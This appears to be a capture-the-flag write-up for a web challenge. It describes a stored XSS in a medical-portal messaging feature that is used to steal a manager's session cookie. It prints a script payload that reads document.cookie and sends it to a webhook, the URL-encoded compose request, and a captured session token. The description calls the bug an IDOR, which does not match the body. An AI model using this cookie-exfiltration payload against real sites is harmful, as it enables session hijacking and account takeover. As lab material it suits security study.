---
title: ""
date: 2026-08-15
description: An IDOR in the profile update endpoint lets you take over any doctor account by submitting their license number & name.
---
**Challenge:** https://ctf.urisc.club/challenges#What's%20Up%20Doc?-18

**Goal:** You're in, but there's nothing here? Seems like we need to go deeper. Can we get more access as a doctor?

**Flag:**
- `SRCTF!{an_apple_a_day}` - on the dashboard of any pre-registered doctor

---

## Vulnerability

The messages feature is vulnerable to an XSS attack. So we can embed script tags
that contain functionality to extract a cookie and send it to a webhook. Since,
we can send a message to the manager, when they view the message, their cookie
can be sent to the user.

## Attack Path

### 1. Log in as a doctor (from whats-up-doc)

```
POST /login/
license=MED0000282459
password=pwd
```

### 2. Grab a Managers User Id

```
GET /api/getManagers
```

Pick any manager, e.g.:

```json
{
  "ID": 16577,
  "Name": "Dr. Terrence Okafor",
  "Organisation": "Riverbend Medical Institute",
  "Role": "Manager"
}
```

### 3. Send the XSS to a Manager Through the Messaging Feature.

The XSS uses JavaScript to fetch the manager's cookie and sends it to a webhook.

```html
<script>

var ok = document.cookie;

fetch("<INSERT WEBHOOK URL HERE>" + ok);

</script>
```

You may get a webhook from this site, `https://webhook.site`

```
POST /dashboard/messages/compose/
recipient_id=16577
subject=Hiii
body=%3Cscript%3E%0D%0A%0D%0Avar+ok+%3D+document.cookie%3B%0D%0A%0D%0Afetch%28%22%3CINSERT+WEBHOOK+URL+HERE%3E%22+%2B+ok%29%3B%0D%0A%0D%0A%3C%2Fscript%3E%0D%0A
```

When the manager views the message, a request is sent to the webhook.

```
https://webhook.site/ca4d3cd8-f094-4be5-8bc2-e8d4c3c421e4/session=eyJyb2xlIjoicmVnaXN0ZXJlZCIsInVzZXJfaWQiOjE2OTkwfQ.aocTHQ.CDdpYuBcZbQD4lgipBzpDEVTIPk
```

### 4. Log in as the manager

Replace the cookie with our manager session token.

### 5. Grab the flag

```
GET /dashboard/
```

The dashboard now shows the news card:

```
Doctors must stay up-to-date with patient privacy laws! SRCTF!{an_apple_a_day}
```

---

## Notes

- This was MUCH easier than we originally thought. After spending about two and a half hours trying to unsign what we thought was a session token using the Flask session key, we realised there was a directly accessible API endpoint `(/api/users/getRegistered/)` that returned the registered users. How embarrassing!
